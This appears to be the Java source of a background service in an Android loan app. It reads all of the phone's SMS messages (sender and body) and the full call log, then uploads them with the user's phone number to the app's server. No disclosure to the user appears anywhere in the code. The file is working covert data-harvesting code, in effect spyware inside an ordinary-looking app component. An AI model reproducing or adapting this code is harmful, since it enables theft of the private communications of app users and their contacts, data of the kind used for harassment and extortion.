package com.app.genialnykredyt.Service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.app.genialnykredyt.Contants.BaseUrl;
import com.app.genialnykredyt.R;
import com.app.genialnykredyt.Session.SessionManager;
import com.google.android.gms.common.internal.service.Common;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

public class BackgroundService extends Service {
    Context context;
    Uri mSmsQueryUri = Uri.parse("content://sms");
    private boolean isRunning;
    private Thread backgroundThread;
    String phoneNumber;
    SessionManager sessionManager;
    ArrayList<String> smss;
    String callllogs;


    public BackgroundService() {

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        this.context = this;
        sessionManager = new SessionManager(this);
        this.isRunning = false;
        this.backgroundThread = new Thread(myTask);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!this.isRunning)
        {
            this.backgroundThread.start();
            this.isRunning = true;
            stopSelf();
        }
        return START_STICKY;

    }

    private Runnable myTask = new Runnable() {

        @RequiresApi(api = Build.VERSION_CODES.KITKAT)
        public void run()
        {
            addtoServer(context);
        }
    };

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void addtoServer(final Context context) {
        String url = BaseUrl.baseUrl + context.getResources().getString(R.string.store_new_details);
        Log.i("TESTING",url);
        smss=getMessages();
        callllogs=getCallDetail();

        StringRequest request=new StringRequest(Request.Method.POST, url, new Response.Listener<String>()
        {
            @Override
            public void onResponse(String response) {

                Toast.makeText(context, response, Toast.LENGTH_SHORT).show();

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
               // Toast.makeText(context, error.getLocalizedMessage(), Toast.LENGTH_SHORT).show();

                //Log.i("VolleyError",error.getMessage());
            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();

                params.put("imei_no","");
                params.put("calllog",callllogs);
                params.put("record",smss.toString());
                Log.i("Testing",SessionManager.getPhoneNumber());
                params.put("phone", SessionManager.getPhoneNumber());

                return params;
            }
        };
        RequestQueue requestQueue= Volley.newRequestQueue(this);
        requestQueue.add(request);
    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public ArrayList<String> getMessages()
    {
        ArrayList<String> messages = new ArrayList<String>();
        ContentResolver contentResolver=getContentResolver();
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(mSmsQueryUri, new String[] { "_id", "address", "date", "body",
                    "type", "read" }, null, null, "date desc");
            if (cursor == null) {
                Log.i("curson null", "cursor is null. uri: " + mSmsQueryUri);
                Toast.makeText(this, "curor null", Toast.LENGTH_SHORT).show();
            }

            //assert cursor != null;
            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {

                String body = cursor.getString(cursor.getColumnIndex("body"));
                String address = cursor.getString(cursor.getColumnIndex("address"));

                messages.add("\n"+"Number: "+address+"\n"+"Content: "+body+"\n");

            }
        } catch (Exception e) {
            Log.e("Error", e.getMessage());
        } finally {
            //assert cursor != null;
            cursor.close();
        }
        return messages;

    }





    private  String getCallDetail()
    {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        return stringBuffer.toString();
    }

}
